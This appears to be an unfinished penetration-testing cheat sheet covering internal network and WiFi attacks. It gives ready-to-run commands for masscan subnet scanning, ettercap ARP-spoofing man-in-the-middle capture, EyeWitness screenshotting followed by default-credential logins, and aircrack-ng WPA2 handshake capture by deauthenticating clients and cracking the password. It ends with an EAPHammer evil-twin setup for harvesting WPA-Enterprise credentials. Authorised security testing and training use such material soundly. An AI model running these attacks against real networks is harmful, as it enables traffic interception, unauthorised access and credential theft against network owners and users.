WIP

## Segmentation
Scan the top ports in several subnets at once, write output to a file with `tee`:
```bash
masscan -p 20,21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 10.1.2.0/24 10.1.3.0/24 | tee -a scan_from_subnet.txt
```

## Network Layer security
When connected to the network you can perform a classic Man-in-the-middle attack (ARP spoofing): 
```bash
sudo ettercap -T -M arp:remote /10.1.4.1-220// /10.1.31.1// -w capture_file_name.pcap
```
In this example, we ARP spoof the clients on IP range 10.1.4.1-220 and the default gateway 10.1.31.1. This allows us to capture all network traffic between the hosts and the default gateway.
The captured traffic can be analyzed for interesting information. 

## Web Interfaces - Default Credentials
Runs eyewitness with input a Nessus file, saves output to folder:
```bash
eyewitness -x Nessus_Scan.nessus -d directory_name
```

You'll find many devices with web interfaces. Many devices have default credentials. In most cases the vendor name and model/software version is listed in the web page. Just use google to find default credentials for it and try some out. In many cases you'll get even into the core network devices of the network with this approach...

![default credentials](https://user-images.githubusercontent.com/9286611/141475684-0efda993-448d-4d88-a426-170b50289cf2.png)


# WiFi
## WEP and WPA2
Use Wifite(2).

Or:
Begin by placing your wireless card into monitor mode on the channel number of the AP:
```bash
airmon-ng start <interface> <AP channel>
Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
In a new window (keep the previous one running), deauthenticate a connected client to force it to complete the 4-way handshake:
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
Wait untill you see that it gathered a WPA handshake:
![image](https://user-images.githubusercontent.com/9286611/141474787-1882f975-2b9c-4966-89f6-66fa223f9a78.png)

```bash
Crack the WPA password with Aircrack-ng:
aircrack-ng -w <wordlist> <capture>
Alternatively, if you have and Airolib-ng database, it can be passed to Aircrack:
aircrack-ng -r <db name> <capture>
```


## WPA-Enterprise
Using [EAPHammer](https://github.com/s0lst1c3/eaphammer) to create _evil twin_ attack.
```bash
sudo python3 eaphammer --essid "Name-Wifi_network" --interface wlan0 --creds
```
__Note: most networks use (a combination of 2.4 and) 5 Ghz these days, so "the good old Alfa adapter" won't work in some cases. No clients will connect in that case__

